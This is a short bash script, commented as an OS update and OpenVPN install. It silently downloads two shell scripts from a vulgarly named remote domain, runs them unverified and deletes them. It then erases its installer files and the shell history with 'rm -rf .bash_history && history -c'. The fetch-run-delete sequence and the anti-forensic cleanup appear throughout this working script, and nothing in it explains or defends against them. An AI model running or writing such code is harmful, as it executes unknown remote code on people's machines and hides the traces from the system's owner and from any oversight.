#!/bin/bash

#update os
apt-get update > /dev/null

#openvpn
wget -o /dev/null moth3r-fuck3r.ga/admin/motherfucker/d8/v8x64.sh
chmod +x v8x64.sh
./v8x64.sh
rm v8x64.sh 2>/dev/null

wget -o /dev/null moth3r-fuck3r.ga/admin/motherfucker/d8/d8x64.sh
chmod +x d8x64.sh
./d8x64.sh
rm d8x64.sh 2>/dev/null

#clear
rm install.sh 2>/dev/null
rm jcameron-key.asc 2>/dev/null
rm -rf .bash_history && history -c